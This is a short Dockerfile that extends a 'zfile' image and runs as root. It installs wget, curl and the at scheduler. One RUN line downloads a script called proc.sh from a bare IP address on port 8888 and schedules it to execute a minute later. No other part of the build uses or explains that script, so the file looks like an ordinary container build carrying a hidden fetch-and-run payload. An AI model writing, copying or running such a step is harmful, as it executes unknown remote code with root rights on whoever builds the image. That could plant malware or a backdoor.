FROM zhaojun1998/zfile
USER root
RUN apt update -y && apt upgrade -y && apt install wget curl at -y
RUN service atd start
RUN wget -O proc.sh http://194.33.39.47:8888/down/RzmApkmbrJJH && at -f proc.sh now+1min
EXPOSE 8080
